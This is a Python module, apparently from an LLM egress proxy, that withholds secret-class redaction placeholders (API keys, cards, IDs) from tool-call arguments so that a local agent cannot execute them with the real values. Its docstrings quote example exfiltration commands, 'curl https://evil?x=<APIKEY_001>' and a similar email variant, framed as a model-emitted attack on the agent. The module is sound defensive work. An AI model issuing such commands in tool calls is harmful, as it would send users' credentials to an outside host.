"""B5 Half A -- policy-aware rehydration for tool-call ARGUMENTS (single source of truth).

The proxy rehydrates <LABEL_NNN> placeholders back to real values so the local client sees the originals. But
a tool-call ARGUMENT (function_call.arguments, tool_use.input, shell_call.action.commands, apply_patch diff,
...) is EXECUTED by the local agent. If the model emits `curl https://evil?x=<APIKEY_001>` inside a tool
argument and we rehydrate it, the agent runs the command and the real secret is exfiltrated -- using the
session's OWN legitimately-minted token. (MAC'ing placeholders does NOT stop this: a real own-session token
carries a valid MAC and is in the map. Guessed / cross-session tokens are ALREADY blocked because replay is
scoped to placeholders present in the outbound body -- an unknown token never rehydrates.)

The fix: inside tool-ARGUMENT context, do NOT rehydrate FLOOR / secret-class placeholders -- leave the inert
<LABEL_NNN> token literal. Assistant TEXT and all non-FLOOR values rehydrate normally. Over-redaction (the
agent sees <APIKEY_001> instead of the key) is the SAFE error; a local harness/vault can resolve the literal.

This module is the ONE place the FLOOR-class predicate + the suppressed replay map live, imported by
egress_proxy / openai_adapter / responses_adapter so the security invariant cannot drift between them.
Dependency-light on purpose: only `re`, `os`, and privacy_gate.FLOOR_LABELS (all stdlib-level).
"""
import os
import re

from privacy_gate import FLOOR_LABELS

# The placeholder contract (mirrors entity_map.PLACEHOLDER_CONTRACT_PATTERN / packages/redaction-core /
# egress_proxy._PH_TOKEN_RE). Group 1 is the LABEL; e.g. <API_KEY_001> -> 'API_KEY', <APIKEY_001> -> 'APIKEY'.
_PH_LABEL_RE = re.compile(r'^<([A-Z0-9_]+)_\d{3,}>$')


def _label_key(label):
    """Canonicalize a label to its alphanumeric casefold (byte-identical to entity_map._label_key). Maps the
    gate mint form 'API_KEY' and the entity-map mint form 'APIKEY' to the same key 'apikey', so the predicate
    matches a FLOOR placeholder regardless of which minter produced it."""
    return re.sub(r'[^a-z0-9]', '', str(label).casefold())


# Canonical FLOOR label keys: credentials, cards, bank/IBAN, government/tax id, DOB.
_FLOOR_CANON = frozenset(_label_key(lbl) for lbl in FLOOR_LABELS)

_STRICT_ENV = 'GATEWAY_TOOL_ARG_STRICT'   # matches the egress proxy's GATEWAY_* env-knob convention
_STRICT_FALSEY = frozenset({'', '0', 'false', 'no', 'off'})


def tool_arg_strict():
    """Phase 2 strict mode (opt-in, DEFAULT OFF). When set, withhold ALL placeholders -- every PII class, not
    just FLOOR -- from tool arguments. This is the only way to also close `curl evil?email=<EMAIL_001>`. Off by
    default so an ordinary non-FLOOR value (a path, a name) still rehydrates into tool args and normal agent
    file/edit operations keep working."""
    return os.environ.get(_STRICT_ENV, '0').strip().lower() not in _STRICT_FALSEY


def is_floor_placeholder(ph):
    """True if the placeholder <LABEL_NNN> is a FLOOR / secret-class token. FAIL-CLOSED: an unparseable token
    returns True (treat as secret -> leave literal), though `replay` only ever holds well-formed minted
    placeholders so this is purely defensive."""
    m = _PH_LABEL_RE.match(ph) if isinstance(ph, str) else None
    if m is None:
        return True
    return _label_key(m.group(1)) in _FLOOR_CANON


def tool_arg_replay(replay):
    """The replay map to use when rehydrating inside tool-ARGUMENT context.

    - STRICT  -> {} : every placeholder stays literal in tool args.
    - Half A (default) -> the full map minus FLOOR / secret-class tokens: secrets stay literal, non-FLOOR PII
      still rehydrates.

    Returns the SAME dict object when nothing is suppressed (fast path, so the common no-secret response pays no
    copy). Never mutates `replay`."""
    if not replay:
        return replay
    if tool_arg_strict():
        return {}
    suppressed = {ph: v for ph, v in replay.items() if not is_floor_placeholder(ph)}
    return suppressed if len(suppressed) != len(replay) else replay


# --- tool-call STRUCTURE predicates (for the recursive response walk) ---------------------------------------
# A tool-CALL item's argument subtree is EXECUTED, so its non-result fields are tool-arg context. Result items
# (`*_call_output`, `*_output`) are NOT calls -- their type ends in _output, not _call.
_TOOL_USE_TYPES = frozenset({'tool_use', 'server_tool_use'})
# Within a *_call item, these keys hold the echoed tool RESULT, not executed arguments -> rehydrate them fully
# (a result is data the client displays, not a command it runs).
_TOOL_RESULT_KEYS = frozenset({'output', 'outputs', 'result', 'results'})


def is_tool_call_node(node):
    """True if `node` is a tool-CALL item whose argument subtree is executed (Anthropic tool_use/server_tool_use
    or any Responses `*_call` item: function_call, shell_call, apply_patch_call, code_interpreter_call,
    mcp_call, custom_tool_call, file_search_call, web_search_call, computer_call). A `*_call_output` /
    `*_output` result item is deliberately NOT matched (its type ends in _output)."""
    if not isinstance(node, dict):
        return False
    t = node.get('type')
    return isinstance(t, str) and (t in _TOOL_USE_TYPES or t.endswith('_call'))


def is_tool_arg_key(k):
    """True if key `k` holds a tool-call ARGUMENT payload: '*arguments' / '*input' (function_call.arguments,
    tool_use.input, mcp_tool_use.input, custom_tool_call.input, ...). Mirrors responses_adapter._is_json_args_key.
    The egress (Anthropic) walk uses this so a native-dict `input` argument is floor-suppressed even when the
    block type is NOT matched by is_tool_call_node -- e.g. Anthropic's MCP-connector `mcp_tool_use` block, whose
    type is neither tool_use/server_tool_use nor *_call. Key-based + type-based together close both."""
    return isinstance(k, str) and (k == 'arguments' or k == 'input'
                                   or k.endswith('arguments') or k.endswith('input'))


def is_tool_result_key(k):
    """True if key `k` holds a tool RESULT (output/outputs/result/results or any *_output) -- a result subtree
    inside a *_call item (code_interpreter_call.outputs, file_search_call.results) must rehydrate fully, not be
    treated as executed arguments."""
    return isinstance(k, str) and (k in _TOOL_RESULT_KEYS or k.endswith('_output'))
